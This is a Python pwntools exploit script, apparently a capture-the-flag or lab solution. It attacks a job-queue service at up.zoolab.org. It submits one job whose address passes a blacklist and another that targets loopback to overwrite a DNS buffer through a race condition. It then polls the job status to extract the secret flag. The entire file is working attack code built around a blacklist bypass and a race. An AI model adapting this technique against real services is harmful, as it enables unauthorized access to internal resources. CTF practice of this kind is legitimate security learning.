#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
import time
from pwn import remote, log

# ───── Configuration ────────────────────────────────────────────── #

TARGET_HOST = 'up.zoolab.org'
TARGET_PORT = 10932

JOB_GOOD     = b'127.0.1.1/10000'   # will pass blacklist
JOB_TRIGGER  = b'127.0.0.1/1'       # will overwrite DNS buffer
FILTER_WORDS = [
    b'Connecting to', b'Resolve failed',
    b'not allowed', b'Connection refused'
]
MAX_CYCLES = 100

# ───── Helper Functions ────────────────────────────────────────── #

def connect():
    """Open remote connection and sync to the menu prompt."""
    conn = remote(TARGET_HOST, TARGET_PORT)
    conn.recvuntil(b'What do you want to do?')
    return conn

def queue_pair(conn):
    """
    Send two 'get flag' jobs in one go:
      1) JOB_GOOD   → allowed address
      2) JOB_TRIGGER→ loopback to trigger overwrite
    """
    conn.send(b'g\n' + JOB_GOOD + b'\ng\n' + JOB_TRIGGER + b'\n')

def view_status(conn):
    """Request the job status and return the raw menu text."""
    conn.sendline(b'v')
    return conn.recvuntil(b'What do you want to do?', timeout=1)

def extract_secret(menu_data):
    """
    Scan each 'Job #' line for a non-error response.
    Return the secret (flag) as bytes, or None.
    """
    for row in menu_data.splitlines():
        if not row.startswith(b'Job #'):
            continue
        # ignore the trigger job
        if JOB_TRIGGER in row:
            continue
        # skip in-progress or error messages
        if any(w in row for w in FILTER_WORDS):
            continue
        # capture the payload after '[addr/port]'
        m = re.match(rb'Job #\d+:\s*(.*)', row)
        if not m:
            continue
        # strip leading "[...]" tag
        return re.sub(rb'^\[[^\]]+\]\s*', b'', m.group(1))
    return None

# ───── Main ────────────────────────────────────────────────────── #

def main():
    session = connect()
    queue_pair(session)
    log.info('Jobs submitted, giving server time to race…')
    time.sleep(0.2)

    for cycle in range(1, MAX_CYCLES + 1):
        data = view_status(session)
        secret = extract_secret(data)
        if secret:
            log.success(f'Secret recovered in cycle {cycle}')
            print(secret.decode('latin1'))
            session.close()
            return
        time.sleep(0.1)

    log.error('Exploit timed out without retrieving the secret')
    session.close()

if __name__ == '__main__':
    main()
